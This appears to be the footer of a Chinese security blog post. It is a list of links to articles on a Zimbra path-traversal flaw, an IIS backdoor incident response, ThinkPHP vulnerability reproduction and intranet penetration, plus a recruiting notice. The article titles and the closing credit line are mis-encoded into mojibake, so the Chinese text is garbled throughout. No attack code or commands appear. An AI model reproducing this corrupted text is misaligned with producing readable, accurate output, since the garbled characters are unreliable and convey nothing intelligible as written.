[CVE-2022-27925 Zimbra Collaboration å­˜åœ¨è·¯å¾„ç©¿è¶Šæ¼æ´æœ€ç»ˆå¯¼è‡´RCE](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247500227&idx=1&sn=d7a5c3dc2d2fb748efe47ebb99fdd76f&chksm=f9e3d752ce945e44f7792615598f0c895569efe10f14cc8ea8f876acc47ec76c9f65dd6ee921&scene=21#wechat_redirect)  

[è®°ä¸€æ¬¡IIS-Raidåé—¨åº”æ€¥ç»å†](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247500224&idx=1&sn=0866feb2ccffe9b5d0e9a61a7d23e3e3&chksm=f9e3d751ce945e471c2e8f70c503edab93527889da5f9a4134e7d580a26cdd25e87233a1e790&scene=21#wechat_redirect)  

[ThinkPHPå¸¸è§æ¡†æ¶æ¼æ´å¤ç°åˆ†æ](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247500219&idx=1&sn=ee977058c3de5aa85ab5c3e9c1a4e8a0&chksm=f9e3d72ace945e3cb2f94db3f483671fff2744b0af64419c80d0d3bc087e337289e1bb3e61cd&scene=21#wechat_redirect)  

[åŸŸæ¸—é€ä¹‹å¤–ç½‘æ‰“ç‚¹åˆ°ä¸‰å±‚å†…ç½‘](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247500214&idx=1&sn=c8a86392a609e64491f6aef5de9167c7&chksm=f9e3d727ce945e314f5995868aa229ede55123655d75302c2b1e710ea45ef32980b04e20d202&scene=21#wechat_redirect)  

[å›¢é˜Ÿæ‹›äººè¿›è¡Œæ—¶ï¼æœŸå¾…ä¼˜ç§€çš„ä½ åŠ å…¥](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247499996&idx=1&sn=1149cabe3f26f190ee51a132764b520f&chksm=f9e3d64dce945f5b0bcd8f4f92609a381180a5ce3d8644faba13b1012a38dda8bf30e540c514&scene=21#wechat_redirect)

  

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

_æŠ€æœ¯æ”¯æŒï¼šç™½å¸½å­ç¤¾åŒºå›¢é˜Ÿ_

_â€”_ æ‰«ç å…³æ³¨æˆ‘ä»¬Â _â€”_